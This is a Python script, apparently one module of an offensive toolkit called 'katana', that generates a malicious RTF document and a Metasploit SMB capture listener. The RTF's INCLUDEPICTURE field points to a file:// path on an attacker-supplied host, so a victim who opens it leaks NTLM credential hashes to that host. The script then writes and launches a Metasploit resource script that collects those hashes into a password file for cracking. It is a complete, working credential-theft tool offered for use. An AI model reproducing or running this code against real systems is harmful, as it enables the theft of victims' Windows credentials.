import os
import sys

template = '{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://[HOST]/[IMAGE]" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}'
msf_script_template = '''
use auxiliary/server/capture/smb
set SRVHOST [HOST]
set JOHNPWFILE passwords
clear
banner
run
'''


def generateMSFScript(host):
    script = open('metasploit.rc', 'w')
    script.write(msf_script_template.replace('[HOST]', host))
    script.close()
    print('[+] Script Generated Successfully [+]')


def runListener(host):
    generateMSFScript(host)
    print('[+] Running Metasploit Auxiliary Module [+]')
    os.system('msfconsole -q -r metasploit.rc')


def generateDocument(host, image):
    return template.replace('[HOST]', host).replace('[IMAGE]', image)


def writeDocument(content):
    filename = 'malicios_document.rtf'
    doc = open(filename, 'w')
    doc.write(content)
    doc.close()
    print('[+] Generated malicious file: ../loot/malicios_document [+]')
    os.system(f'mv {filename} ../loot/')
    input('[+]Enter to continue. . .')


def main():
    if (len(sys.argv) < 3):
        print('\nUsage : katana_wordntlm.py IP IMAGENAME run_listener \n')
        print('Example: katana_wordntlm.py 127.0.0.1 test.jpg 0\n')  # will not run listener
        print('Example: katana_wordntlm.py 127.0.0.1 test.jpg 1')  # will  run listener
    else:
        host = sys.argv[1]
        image = sys.argv[2]
        run_msf = sys.argv[3]
        writeDocument(generateDocument(host, image))
        if (int(run_msf) == 1):
            runListener(host)
    print('\n\n')


if __name__ == "__main__":
    main()